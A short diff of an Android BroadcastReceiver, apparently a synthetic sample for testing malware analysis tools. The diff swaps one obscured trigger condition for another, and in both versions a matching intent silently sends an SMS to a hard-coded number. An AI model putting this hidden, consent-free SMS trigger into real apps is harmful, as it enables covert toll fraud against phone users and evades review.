@@ -11,18 +11,14 @@ public class ExampleReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
 
         String xxx="rrr";
-        String ttt="zzz";
-        xxx=xxx+ttt;
-        int zz=7;
-        int yy=zz/new Integer(10);
+        int x=new Integer(2);
+        String sss=String.valueOf(x);
 
-
-        if(intent.getAction().equals(xxx))
+        String ttt=sss+xxx;
+        if(intent.getStringExtra("ggg").equals(ttt))
         {
-            if(intent.getIntExtra("type",-1)==yy)
-            {
-                SmsManager.getDefault().sendTextMessage("18010823840", null, "ttttt", null, null);
-            }
+            SmsManager.getDefault().sendTextMessage("123456789", null, "fff", null, null);
         }
+
     }
 }
